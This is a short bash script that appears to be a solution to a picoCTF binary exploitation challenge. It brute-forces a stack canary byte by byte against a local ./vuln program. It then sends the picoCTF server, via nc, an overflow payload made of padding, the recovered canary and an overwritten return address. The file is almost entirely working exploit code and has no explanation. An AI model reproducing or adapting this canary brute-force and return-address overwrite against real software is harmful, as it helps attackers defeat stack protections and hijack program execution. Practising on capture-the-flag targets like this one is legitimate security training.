#!/bin/bash

#bufsize + first byte from canary
bytes=64
aux=$(($bytes - 64))
#define BUFSIZE 64
size=$(($bytes-$aux))

echo "[*] Bruteforcing canary..."
#fill all the buffer
for x in 1 1 1 1; do
	bytes=$(($bytes + $x))
	buf=$(for i in `seq $size`; do echo -n "A";done)
	for((i=32;i<127;i++)); do
		current_canary=$(printf "\\$(printf %03o "$i")")
		payload=${buf}${old_canary}${current_canary}
		result=$(echo -ne "$bytes\n$payload" | ./vuln)
	#	result=$(echo -ne "$bytes\n$payload" | nc saturn.picoctf.net 49980)
		if [ "$(echo -n $result | grep Ok)" ]; then
			old_canary=${old_canary}${current_canary}
			echo $old_canary
			echo ${buf}${old_canary}
			break
		fi
	done
done

echo -e "[*] End bruteforcing. Canary found: $old_canary\nExploiting..."
payload=$(echo 100;for i in `seq 64`; do echo -n "A";done; echo -n $old_canary; echo -n "16BytesOfGarbage"; echo -ne "\x36\x93\x04\x08")

echo -ne "$payload" | nc saturn.picoctf.net 54738
